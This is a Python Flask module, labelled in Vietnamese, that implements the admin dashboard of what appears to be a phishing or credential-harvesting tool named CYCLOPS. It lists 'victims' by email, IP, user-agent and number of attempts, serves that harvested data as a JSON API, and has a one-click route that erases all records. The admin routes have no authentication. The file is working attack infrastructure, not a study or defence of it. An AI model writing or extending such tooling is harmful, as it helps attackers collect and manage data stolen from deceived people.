#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import render_template_string, request, jsonify, redirect
from backend.database import db
from backend.logger import logger
from datetime import datetime

class AdminPanel:
    """Panel quản trị với giao diện đẹp mắt"""
    
    def __init__(self, app):
        self.app = app
        self._register_routes()
    
    def _register_routes(self):
        """Đăng ký các route admin"""
        
        @self.app.route('/admin')
        def admin_dashboard():
            """Dashboard tổng quan"""
            stats = db.get_stats()
            victims = db.get_victims(20)
            
            html = '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>🔥 CYCLOPS Admin</title>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body { 
                        background: #0a0a0f; 
                        color: #e0e0e0; 
                        font-family: 'Courier New', monospace;
                        padding: 20px;
                    }
                    .container { max-width: 1200px; margin: 0 auto; }
                    .header { 
                        border-bottom: 2px solid #ff0040; 
                        padding: 20px 0;
                        margin-bottom: 30px;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                    }
                    .header h1 { 
                        color: #ff0040; 
                        text-shadow: 0 0 20px rgba(255,0,64,0.3);
                        font-size: 28px;
                    }
                    .stats {
                        display: grid;
                        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                        gap: 20px;
                        margin-bottom: 30px;
                    }
                    .stat-card {
                        background: #1a1a2e;
                        padding: 20px;
                        border-radius: 12px;
                        border: 1px solid #2a2a4a;
                        text-align: center;
                    }
                    .stat-card .number {
                        font-size: 36px;
                        font-weight: bold;
                        color: #ff0040;
                    }
                    .stat-card .label {
                        color: #888;
                        margin-top: 8px;
                    }
                    table {
                        width: 100%;
                        border-collapse: collapse;
                        background: #1a1a2e;
                        border-radius: 12px;
                        overflow: hidden;
                    }
                    th {
                        background: #2a2a4a;
                        padding: 12px;
                        text-align: left;
                        color: #ff0040;
                    }
                    td {
                        padding: 12px;
                        border-bottom: 1px solid #2a2a4a;
                    }
                    tr:hover { background: #252540; }
                    .badge {
                        background: #ff0040;
                        color: white;
                        padding: 2px 10px;
                        border-radius: 12px;
                        font-size: 12px;
                    }
                    .actions {
                        margin-top: 20px;
                        display: flex;
                        gap: 10px;
                    }
                    .btn {
                        padding: 10px 20px;
                        border: none;
                        border-radius: 8px;
                        cursor: pointer;
                        font-family: inherit;
                        font-weight: bold;
                        transition: 0.3s;
                    }
                    .btn-danger {
                        background: #ff0040;
                        color: white;
                    }
                    .btn-danger:hover {
                        background: #cc0033;
                        transform: scale(1.05);
                    }
                    .btn-clear {
                        background: #333;
                        color: white;
                    }
                    .btn-clear:hover {
                        background: #555;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>🔥 CYCLOPS - Mắt Thần</h1>
                        <span style="color:#888;">Online | {{ now }}</span>
                    </div>
                    
                    <div class="stats">
                        <div class="stat-card">
                            <div class="number">{{ stats.total_victims }}</div>
                            <div class="label">🎯 Nạn nhân</div>
                        </div>
                        <div class="stat-card">
                            <div class="number">{{ stats.unique_ips }}</div>
                            <div class="label">🌐 IP duy nhất</div>
                        </div>
                        <div class="stat-card">
                            <div class="number">{{ stats.total_attempts }}</div>
                            <div class="label">🔄 Lần thử</div>
                        </div>
                    </div>
                    
                    <h2 style="margin-bottom:15px;">📋 Dữ liệu thu thập</h2>
                    <table>
                        <tr>
                            <th>#</th>
                            <th>Email</th>
                            <th>IP</th>
                            <th>User-Agent</th>
                            <th>Thời gian</th>
                            <th>Lần thử</th>
                        </tr>
                        {% for v in victims %}
                        <tr>
                            <td>{{ v.id }}</td>
                            <td>{{ v.email }}</td>
                            <td>{{ v.ip }}</td>
                            <td style="font-size:12px;color:#888;">{{ v.user_agent[:35] }}...</td>
                            <td>{{ v.timestamp[:19] }}</td>
                            <td><span class="badge">{{ v.attempts }}</span></td>
                        </tr>
                        {% endfor %}
                    </table>
                    
                    <div class="actions">
                        <button class="btn btn-danger" onclick="if(confirm('Xóa tất cả?')){fetch('/admin/clear',{method:'POST'}).then(()=>location.reload())}">
                            💀 Xóa tất cả
                        </button>
                        <button class="btn btn-clear" onclick="location.reload()">
                            🔄 Refresh
                        </button>
                    </div>
                </div>
                <script>
                    setInterval(() => location.reload(), 5000);
                </script>
            </body>
            </html>
            '''
            
            return render_template_string(
                html, 
                stats=stats, 
                victims=victims,
                now=datetime.now().strftime('%H:%M:%S')
            )
        
        @self.app.route('/admin/clear', methods=['POST'])
        def admin_clear():
            """Xóa toàn bộ dữ liệu"""
            db.clear_all()
            logger.warning("💀 All data cleared via admin panel")
            return jsonify({'status': 'success'})
        
        @self.app.route('/admin/api/victims')
        def admin_api_victims():
            """API lấy dữ liệu dạng JSON"""
            victims = db.get_victims(100)
            return jsonify(victims)
